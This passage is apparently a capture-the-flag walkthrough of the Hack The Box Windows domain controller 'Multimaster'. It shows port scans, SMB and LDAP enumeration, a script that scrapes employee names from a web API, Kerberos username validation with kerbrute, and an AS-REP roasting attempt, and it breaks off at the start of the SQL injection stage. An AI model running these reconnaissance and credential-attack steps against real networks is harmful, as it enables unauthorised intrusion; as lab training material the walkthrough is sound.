# [multimaster](https://app.hackthebox.com/machines/Multimaster)

> A Windows Active Directory domain controller serving a web application that interacts with a MIcrosoft SQL Server database. The web application is vulnerable to SQL injection, making it possible to extract and crack password hashes and enumerate domain principals. One of these username and password pairs is valid, granting WinRM access to the target. A version of Visual Studio Code that is vulnerable to **CVE-2019-1414** is being ran on a scheduled task, providing a lateral movement vector to another account. This account is in the `Developers` group, which has access to `C:\inetpub`. `C:\inetpub` contains the `.NET` DLL that defines the web application API. Reverse engineering this DLL reveals the password used to access the Microsoft SQL Server database, and this password belongs to one of the previously discovered domain users. This domain user is in the `Server Operators` group, who can use `robocopy` to bypass the system flag's ACLs and retrieve the flag.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.95.200 --rate=1000 -e tun0 --output-format grepable --output-filename enum/multimaster.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-20 04:09:03 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/multimaster.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,3389,389,445,464,49666,49667,49674,49675,49678,49687,49699,53,593,5985,636,80,88,9389,
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,3389,389,445,464,49666,49667,49674,49675,49678,49687,49699,53,593,5985,636,80,88,9389 10.129.95.200 -oA enum/multimaster
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 23:14 EST
Nmap scan report for 10.129.95.200
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-20 04:21:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2021-11-20T04:23:16+00:00; +6m59s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2021-07-18T03:29:10
|_Not valid after:  2022-01-17T03:29:10
| rdp-ntlm-info:
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2021-11-20T04:22:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h42m59s, deviation: 3h34m40s, median: 6m59s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2021-11-19T20:22:38-08:00
| smb2-time:
|   date: 2021-11-20T04:22:37
|_  start_date: 2021-11-20T04:14:17
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
```

The open ports 53, 88, 389, and 636 all indicate that the target is Windows Active Directory domain controller. The output from the LDAP ports indicate the domain name is `megacorp.local` and the output from `nmap`'s `smb-os-discovery` script indicates the FQDN of the target is `multimaster.megacorp.local` and its operating system is Windows Server 2016.

### UDP

```bash
$ sudo nmap -sU 10.129.95.200
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 23:18 EST
Nmap scan report for 10.129.95.200
Host is up (0.056s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 499.45 seconds
```

---

## SMB Enumeration

There doesn't appear to be anonymous or guest SMB access.

```bash
$ smbmap -P 445 -H 10.129.95.200
[+] IP: 10.129.95.200:445       Name: megacorp.local
```

```bash
$ smbmap -u "guest" -p "" -P 445 -H 10.129.95.200
[!] Authentication error on 10.129.95.200
```

---

## LDAP Enumeration

Nothing significantly valuable from an anonymous LDAP binding.

```bash
$ nmap -n -sV --script "ldap* and not brute" 10.129.95.200
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-22 16:51 EST
Nmap scan report for 10.129.95.200
Host is up (0.047s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-22 21:58:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211122215843.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       dsServiceName: CN=NTDS Settings,CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL
|       defaultNamingContext: DC=MEGACORP,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       configurationNamingContext: CN=Configuration,DC=MEGACORP,DC=LOCAL
|       rootDomainNamingContext: DC=MEGACORP,DC=LOCAL
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 282733
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: MULTIMASTER.MEGACORP.LOCAL
|       ldapServiceName: MEGACORP.LOCAL:multimaster$@MEGACORP.LOCAL
|       serverName: CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211122215843.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       dsServiceName: CN=NTDS Settings,CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL
|       defaultNamingContext: DC=MEGACORP,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       configurationNamingContext: CN=Configuration,DC=MEGACORP,DC=LOCAL
|       rootDomainNamingContext: DC=MEGACORP,DC=LOCAL
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 282733
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: MULTIMASTER.MEGACORP.LOCAL
|       ldapServiceName: MEGACORP.LOCAL:multimaster$@MEGACORP.LOCAL
|       serverName: CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
```

```bash
$ ldapsearch -LLL -x -h 10.129.95.200 -p 389 -b 'dc=megacorp,dc=local' '(&(objectclass=computer)(name=*))'
Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v3839
```

---

## Web Enumeration

### Content Discovery

Every nonexistent path returned a 403, so 403s had to be excluded to produce helpful output.

```bash
$ gobuster dir -u http://multimaster.megacorp.local -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -b 403,404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://multimaster.megacorp.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/22 17:06:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 164] [--> http://multimaster.megacorp.local/images/]
/js                   (Status: 301) [Size: 160] [--> http://multimaster.megacorp.local/js/]
/css                  (Status: 301) [Size: 161] [--> http://multimaster.megacorp.local/css/]
/scripts              (Status: 301) [Size: 165] [--> http://multimaster.megacorp.local/scripts/]

===============================================================
2021/11/22 17:09:37 Finished
===============================================================
```

### Virtual Host Discovery

All enumerated virtual hosts return 403s.

```bash
$ gobuster vhost -u http://megacorp.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
```

### Manual Enumeration

The home page redirects to `/#` and downloads `/js/app.eeb965b5.js`, which appears to be some sort of JavaScript single page application bundle.

The web application appears to be built with `Vue.js`. However, it cannot be inspected by the Vue Developer Tools.

![](images/Pasted%20image%2020211122172328.png)

---

## Web Username Enumeration

The colleague finder feature at `/#/app` is very interesting. It makes it possible to search and return potential users. It doesn't require exact matches, but will return users based on substrings.

![](images/Pasted%20image%2020211122172825.png)

The backend API endpoint that makes it possible to retrieve these users is `/api/getColleagues`. It takes JSON input and returns JSON output. The following request and response bodies match the above query.

```http
POST /api/getColleagues HTTP/1.1
Host: multimaster.megacorp.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 12
Origin: http://multimaster.megacorp.local
Connection: close
Referer: http://multimaster.megacorp.local/

{
    "name": "a"
}
```

```http
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Mon, 22 Nov 2021 22:32:32 GMT
Connection: close
Content-Length: 1625

[
    {
        "id": 1,
        "name": "Sarina Bauer",
        "position": "Junior Developer",
        "email": "sbauer@megacorp.htb",
        "src": "sbauer.jpg"
    },
    {
        "id": 2,
        "name": "Octavia Kent",
        "position": "Senior Consultant",
        "email": "okent@megacorp.htb",
        "src": "okent.jpg"
    },
    {
        "id": 3,
        "name": "Christian Kane",
        "position": "Assistant Manager",
        "email": "ckane@megacorp.htb",
        "src": "ckane.jpg"
    },
    {
        "id": 4,
        "name": "Kimberly Page",
        "position": "Financial Analyst",
        "email": "kpage@megacorp.htb",
        "src": "kpage.jpg"
    },
    {
        "id": 5,
        "name": "Shayna Stafford",
        "position": "HR Manager",
        "email": "shayna@megacorp.htb",
        "src": "shayna.jpg"
    },
    {
        "id": 6,
        "name": "James Houston",
        "position": "QA Lead",
        "email": "james@megacorp.htb",
        "src": "james.jpg"
    },
    {
        "id": 8,
        "name": "Reya Martin",
        "position": "Tech Support",
        "email": "rmartin@megacorp.htb",
        "src": "rmartin.jpg"
    },
    {
        "id": 9,
        "name": "Zac Curtis",
        "position": "Junior Analyst",
        "email": "zac@magacorp.htb",
        "src": "zac.jpg"
    },
    {
        "id": 10,
        "name": "Jorden Mclean",
        "position": "Full-Stack Developer",
        "email": "jorden@megacorp.htb",
        "src": "jorden.jpg"
    },
    {
        "id": 11,
        "name": "Alyx Walters",
        "position": "Automation Engineer",
        "email": "alyx@megacorp.htb",
        "src": "alyx.jpg"
    },
    {
        "id": 12,
        "name": "Ian Lee",
        "position": "Internal Auditor",
        "email": "ilee@megacorp.htb",
        "src": "ilee.jpg"
    },
    {
        "id": 13,
        "name": "Nikola Bourne",
        "position": "Head of Accounts",
        "email": "nbourne@megacorp.htb",
        "src": "nbourne.jpg"
    },
    {
        "id": 14,
        "name": "Zachery Powers",
        "position": "Credit Analyst",
        "email": "zpowers@megacorp.htb",
        "src": "zpowers.jpg"
    },
    {
        "id": 15,
        "name": "Alessandro Dominguez",
        "position": "Senior Web Developer",
        "email": "aldom@megacorp.htb",
        "src": "aldom.jpg"
    },
    {
        "id": 16,
        "name": "MinatoTW",
        "position": "CEO",
        "email": "minato@megacorp.htb",
        "src": "minato.jpg"
    }
]
```

The following script queries the API with each letter of the alphabet and aggregates all of the potential usernames.

```python
import json
import string
import time

import requests


# Retrieve all the employees
employees = []
url = "http://multimaster.megacorp.local/api/getColleagues"
for i, character in enumerate(string.ascii_letters):
    print(f"[*] On character: {character}")
    body = {"name": character}
    with requests.post(url, json=body) as response:
        assert response.status_code == 200, response.text
        query_employees = response.json()
        for employee in query_employees:
            employees.append(employee)
    if (i + 1) % 30 == 0:
        time.sleep(60)

# Remove any duplicate employees
filtered_employees = list({frozenset(employee.items()): employee for employee in employees}.values())

# Write the final list of employees to a file
with open("employees.json", "w") as f:
    json.dump(filtered_employees, f)
```

The resultant employees sorted by ID:

```json
[
  {
    "id": 1,
    "name": "Sarina Bauer",
    "position": "Junior Developer",
    "email": "sbauer@megacorp.htb",
    "src": "sbauer.jpg"
  },
  {
    "id": 2,
    "name": "Octavia Kent",
    "position": "Senior Consultant",
    "email": "okent@megacorp.htb",
    "src": "okent.jpg"
  },
  {
    "id": 3,
    "name": "Christian Kane",
    "position": "Assistant Manager",
    "email": "ckane@megacorp.htb",
    "src": "ckane.jpg"
  },
  {
    "id": 4,
    "name": "Kimberly Page",
    "position": "Financial Analyst",
    "email": "kpage@megacorp.htb",
    "src": "kpage.jpg"
  },
  {
    "id": 5,
    "name": "Shayna Stafford",
    "position": "HR Manager",
    "email": "shayna@megacorp.htb",
    "src": "shayna.jpg"
  },
  {
    "id": 6,
    "name": "James Houston",
    "position": "QA Lead",
    "email": "james@megacorp.htb",
    "src": "james.jpg"
  },
  {
    "id": 7,
    "name": "Connor York",
    "position": "Web Developer",
    "email": "cyork@megacorp.htb",
    "src": "cyork.jpg"
  },
  {
    "id": 8,
    "name": "Reya Martin",
    "position": "Tech Support",
    "email": "rmartin@megacorp.htb",
    "src": "rmartin.jpg"
  },
  {
    "id": 9,
    "name": "Zac Curtis",
    "position": "Junior Analyst",
    "email": "zac@magacorp.htb",
    "src": "zac.jpg"
  },
  {
    "id": 10,
    "name": "Jorden Mclean",
    "position": "Full-Stack Developer",
    "email": "jorden@megacorp.htb",
    "src": "jorden.jpg"
  },
  {
    "id": 11,
    "name": "Alyx Walters",
    "position": "Automation Engineer",
    "email": "alyx@megacorp.htb",
    "src": "alyx.jpg"
  },
  {
    "id": 12,
    "name": "Ian Lee",
    "position": "Internal Auditor",
    "email": "ilee@megacorp.htb",
    "src": "ilee.jpg"
  },
  {
    "id": 13,
    "name": "Nikola Bourne",
    "position": "Head of Accounts",
    "email": "nbourne@megacorp.htb",
    "src": "nbourne.jpg"
  },
  {
    "id": 14,
    "name": "Zachery Powers",
    "position": "Credit Analyst",
    "email": "zpowers@megacorp.htb",
    "src": "zpowers.jpg"
  },
  {
    "id": 15,
    "name": "Alessandro Dominguez",
    "position": "Senior Web Developer",
    "email": "aldom@megacorp.htb",
    "src": "aldom.jpg"
  },
  {
    "id": 16,
    "name": "MinatoTW",
    "position": "CEO",
    "email": "minato@megacorp.htb",
    "src": "minato.jpg"
  },
  {
    "id": 17,
    "name": "egre55",
    "position": "CEO",
    "email": "egre55@megacorp.htb",
    "src": "egre55.jpg"
  }
]
```

Each user's `email` attribute is on the domain `megacorp.htb`. Add this domain to the local DNS resolver. Extract each of the usernames.

```bash
$ cat employees.json | jq -r '.[].email' | cut -d'@' -f 1 > users.txt
$ cat users.txt
sbauer
okent
ckane
kpage
shayna
james
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minato
cyork
egre55
```

---

## Kerberos Pre-Authentication Username Enumeration

Not all of the users discovered from the colleague finder are valid. The three invalid users were `shayna`, `minato`, and `egre55`. `minato` and `egre55` are the creators of the box.

```bash
$ kerbrute userenum -d megacorp.local --dc 10.129.95.200 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/22/21 - Ronnie Flathers @ropnop

2021/11/22 20:56:38 >  Using KDC(s):
2021/11/22 20:56:38 >   10.129.95.200:88

2021/11/22 20:56:38 >  [+] VALID USERNAME:       james@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       kpage@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       zac@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       rmartin@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       sbauer@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       jorden@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       okent@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       alyx@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       ckane@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       nbourne@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       ilee@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       aldom@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       zpowers@megacorp.local
2021/11/22 20:56:38 >  [+] VALID USERNAME:       cyork@megacorp.local
2021/11/22 20:56:38 >  Done! Tested 17 usernames (14 valid) in 0.102 seconds
```

---

## ASREP Roasting

None of the valid users are ASREP Roastable.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.95.200 megacorp.local/ -usersfile users.txt -format hashcat
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cyork doesn't have UF_DONT_REQUIRE_PREAUTH set
```

---

## Web Login Form

There's a web login form at `/#/login`.

![](images/Pasted%20image%2020211123100047.png)

However, apprently the login system is currently under maintenance.

![](images/Pasted%20image%2020211123100238.png)

---

## SQL Injection

The colleague finder appears to interact with a backend database and thus, could possibly be vulnerable to SQL injection. The backend query being issued appears to be:

```sql
SELECT id,name,title,email,src FROM employees WHERE name LIKE '$INPUT';
```

Antime a common SQL injection character is sent, the web application returns a 403 Forbidden, indicating the presence of a we application firewall.

```http
POST /api/getColleagues HTTP/1.1
Host: multimaster.megacorp.local
